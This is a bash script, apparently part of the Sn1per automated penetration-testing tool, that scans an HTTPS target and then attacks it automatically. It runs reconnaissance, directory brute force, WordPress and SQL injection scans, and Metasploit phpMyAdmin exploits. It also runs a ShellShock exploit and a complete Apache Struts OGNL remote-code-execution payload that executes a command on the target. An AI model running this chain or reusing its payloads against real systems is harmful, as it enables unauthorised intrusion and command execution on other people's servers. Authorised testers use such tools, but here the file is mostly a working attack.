#!/bin/bash

VER="2.5"
TARGET="$1"
MODE="$2"
OPT1="$3"
DISABLE_POSTGRESQL="true" # disabling postgresql startup, assuming it's running already
INSTALL_DIR="/usr/share/sniper"
LOOT_DIR="/usr/share/sniper/loot"
PLUGINS_DIR="/usr/share/sniper/plugins"
CMSMAP="/usr/share/sniper/plugins/CMSmap/cmsmap.py"
SAMRDUMP="/usr/share/sniper/bin/samrdump.py"
DNSDICT6="/usr/share/sniper/bin/dnsdict6"
INURLBR="/usr/share/sniper/bin/inurlbr.php"
USER_FILE="/usr/share/brutex/wordlists/simple-users.txt"
PASS_FILE="/usr/share/brutex/wordlists/password.lst"
DNS_FILE="/usr/share/brutex/wordlists/namelist.txt"
SUPER_MICRO_SCAN="/usr/share/sniper/plugins/SuperMicro-Password-Scanner/supermicro_scan.sh"
DEFAULT_PORTS="21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,623,624,1099,1433,1524,2049,2121,3128,3306,3310,3389,3632,4443,5432,5800,5900,5984,6667,8000,8009,8080,8180,8443,8888,10000,16992,27017,27018,27019,28017,49152,U:53,U:67,U:68,U:88,U:161,U:162,U:137,U:138,U:139,U:389,U:520,U:2049"
DEFAULT_TCP_PORTS="21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,623,624,1099,1433,1524,2049,2121,3306,3128,3310,3389,3632,4443,5432,5800,5900,5984,6667,8000,8009,8080,8180,8443,8888,10000,16992,27017,27018,27019,28017,49152"
DEFAULT_UDP_PORTS="53,67,68,88,161,162,137,138,139,389,520,2049"
THREADS="30"
OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
RESET='\e[0m'
REGEX='^[0-9]+$'

# ENABLE/DISABLE AUTOMATIC BRUTE FORCE
# DEFAULT IS "1" (ENABLED)
AUTOBRUTE="1"

# ENABLE/DISABLE FULL DETAILED NMAP SCAN
# DEFAULT IS "1" (ENABLED)
FULLNMAPSCAN="1"

# ENABLE/DISABLE AUTOMATIC GOOGLE HACKING QUERIES
# DEFAULT IS "1" (ENABLED)
GOOHAK="1"

# ENABLE AUTO UPDATES
# DEFAULT IS "1" (ENABLED)
ENABLE_AUTO_UPDATES="1"

cd $INSTALL_DIR

if [[ ${TARGET:0:1} =~ $REGEX ]];
	then
	SCAN_TYPE="IP"
else
	SCAN_TYPE="DOMAIN"
fi
	echo -e "$OKORANGE + -- --=[Port 443 opened... running tests...$RESET"
	echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
	wafw00f https://$TARGET
	echo ""
	echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
	whatweb https://$TARGET
	echo ""
	echo -e "$OKGREEN + -- ----------------------------=[Gathering SSL/TLS Info]=------------------ -- +$RESET"
	sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET
	sslscan --no-failed $TARGET
	testssl $TARGET
	echo ""
	cd $PLUGINS_DIR/MassBleed
	./massbleed $TARGET port 443
	cd $INSTALL_DIR
	echo -e "$OKGREEN + -- ----------------------------=[Checking HTTP Headers]=------------------- -- +$RESET"
	echo -e "$OKBLUE+ -- --=[Checking if X-Content options are enabled on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I https://$TARGET | egrep -i 'X-Content' | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking if X-Frame options are enabled on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I https://$TARGET | egrep -i 'X-Frame' | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking if X-XSS-Protection header is enabled on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I https://$TARGET | egrep -i 'X-XSS' | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking HTTP methods on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I -X OPTIONS https://$TARGET | grep Allow
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking if TRACE method is enabled on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I -X TRACE https://$TARGET | grep TRACE
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for META tags on $TARGET...$RESET $OKORANGE"
	curl -s --insecure https://$TARGET | egrep -i meta --color=auto | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for open proxy on $TARGET...$RESET $OKORANGE"
	curl -x https://$TARGET:443 -L https://crowdshield.com/.testing/openproxy.txt -s --insecure | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Enumerating software on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I https://$TARGET | egrep -i "Server:|X-Powered|ASP|JSP|PHP|.NET" | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking if Strict-Transport-Security is enabled on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I https://$TARGET/ | egrep -i "Strict-Transport-Security" | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for Flash cross-domain policy on $TARGET...$RESET $OKORANGE"
	curl -s --insecure https://$TARGET/crossdomain.xml | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for Silverlight cross-domain policy on $TARGET...$RESET $OKORANGE"
	curl -s --insecure https://$TARGET/clientaccesspolicy.xml | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for HTML5 cross-origin resource sharing on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I https://$TARGET | egrep -i "Access-Control-Allow-Origin" | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Retrieving robots.txt on $TARGET...$RESET $OKORANGE"
	curl -s --insecure https://$TARGET/robots.txt | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Retrieving sitemap.xml on $TARGET...$RESET $OKORANGE"
	curl -s --insecure https://$TARGET/sitemap.xml | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking cookie attributes on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I https://$TARGET | egrep -i "Cookie:" | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for ASP.NET Detailed Errors on $TARGET...$RESET $OKORANGE"
	curl -s --insecure https://$TARGET/%3f.jsp | egrep -i 'Error|Exception' | tail -n 10
	curl -s --insecure https://$TARGET/test.aspx -L | egrep -i 'Error|Exception|System.Web.' | tail -n 10
	echo ""
	echo -e "$RESET"
	echo -e "$OKGREEN + -- ----------------------------=[Running Web Vulnerability Scan]=---------- -- +$RESET"
	nikto -h http://$TARGET:443 -output $LOOT_DIR/nmap/nmapNIKTO443-$TARGET.xml
	echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
	cutycapt --url=https://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port443.jpg
	echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$TARGET-port443.jpg"


		echo -e "$OKGREEN + -- ----------------------------=[Running NMap HTTP Scripts]=--------------- -- +$RESET"
		nmap -A -sV -T4 -Pn -p 443 --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse --script=http-enum,http-headers,http-server-header,http-php-version,http-iis-webdav-vuln,http-vuln-*,http-phpmyadmin-dir-traversal $TARGET -oX $LOOT_DIR/nmap/nmap443-$TARGET.xml
		echo -e "$OKGREEN + -- ----------------------------=[Running Directory Brute Force]=----------- -- +$RESET"
		dirb https://$TARGET /usr/share/wordlists/dirb/big.txt -o $LOOT_DIR/notes/dirb443_out.txt
		rm $LOOT_DIR/notes/dirb443_directories.txt
		rm -rf $LOOT_DIR/notes/dirb443Ext
		cat $LOOT_DIR/notes/dirb443_out.txt | grep "==>" | cut -f3 -d ' ' > $LOOT_DIR/notes/dirb443_directories.txt
		DIRB443DIR="$(cat $LOOT_DIR/notes/dirb443_directories.txt)"
		if [ -n "$DIRB443DIR" ]; then
			echo -e "$OKGREEN + -- ----------------------------=[Finding txt, php, and html Files In Directories]=----------- -- +$RESET"
			mkdir $LOOT_DIR/notes/dirb443Ext
			for a in `cat $LOOT_DIR/notes/dirb443_directories.txt`; do dirb $a -X .txt,.php,.html -o $LOOT_DIR/notes/dirb443Ext/$(echo $a | sed -e 's/\//_/g').txt; done;
			cat $LOOT_DIR/notes/dirb443Ext/*.txt | grep "+" | cut -d " " -f2 > $LOOT_DIR/notes/dirb443Ext/dirb443FoundFiles.txt

			DIRB443SHOTS="$(cat $LOOT_DIR/notes/dirb443Ext/dirb443FoundFiles.txt)"
			if [ -n "$DIRB443SHOTS" ]; then
				echo -e "$OKGREEN + -- ----------------------------=[Making Screenshots of txt, php, and html Files In Found Directories]=----------- -- +$RESET"
				for a in `cat $LOOT_DIR/notes/dirb443Ext/dirb443FoundFiles.txt`; do cutycapt --url=$a --out=$LOOT_DIR/screenshots/$(echo $a | sed -e 's/\//_/g')-port443.jpg; done;
				find $LOOT_DIR/screenshots/ -size -10k -exec rm -f {} \; 2> /dev/null
			else
				echo -e "$OKORANGE + No Files Found by Dirb +$RESET"
			fi
		else
			echo -e "$OKORANGE + No Directories Found by Dirb +$RESET"
		fi
		echo -e "$OKGREEN + -- ----------------------------=[Running Wordpress Vulnerability Scans]=--- -- +$RESET"
		wpscan --url https://$TARGET --batch
		echo ""
		wpscan --url https://$TARGET/wordpress/ --batch
		echo -e "$OKGREEN + -- ----------------------------=[Running CMSMap]=-------------------------- -- +$RESET"
		python $CMSMAP -t https://$TARGET
		echo ""
		python $CMSMAP -t https://$TARGET/wordpress/
		echo ""
		if [ $ARACHNI == "1" ];
		then
			echo -e "$OKGREEN + -- ----------------------------=[Skipping Arachni Scan]=------------------- -- +$RESET"
		else
			echo -e "$OKGREEN + -- ----------------------------=[Running Arachni Web Application Scan]=---- -- +$RESET"
			mkdir -p $INSTALL_DIR/loot/web/$TARGET-https/ 2> /dev/null
			arachni --report-save-path=$INSTALL_DIR/loot/web/$TARGET-https/ --output-only-positives https://$TARGET
			cd $INSTALL_DIR/loot/web/$TARGET-https/
			arachni_reporter $INSTALL_DIR/loot/web/$TARGET-https/*.afr --report=html:outfile=$INSTALL_DIR/loot/web/$TARGET-https/arachni.zip
			unzip $INSTALL_DIR/loot/web/$TARGET-https/arachni.zip
			cd $INSTALL_DIR
		fi
		echo -e "$OKGREEN + -- ----------------------------=[Running SQLMap SQL Injection Scan]=------- -- +$RESET"
		sqlmap -u "https://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
		echo -e "$OKGREEN + -- ----------------------------=[Running PHPMyAdmin Metasploit Exploit]=--- -- +$RESET"
		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 443; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
		echo -e "$OKGREEN + -- ----------------------------=[Running ShellShock Auto-Scan Exploit]=---- -- +$RESET"
		python $PLUGINS_DIR/shocker/shocker.py -H $TARGET --cgilist $PLUGINS_DIR/shocker/shocker-cgi_list --port 443 --ssl
		echo -e "$OKGREEN + -- ----------------------------=[Running Apache Jakarta RCE Exploit]=------ -- +$RESET"
		curl -s -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" https://$TARGET | head -n 1
echo -e "$OKGREEN + -- ----------------------------=[Exiting Sniper sh script]=---- -- +$RESET"
exit
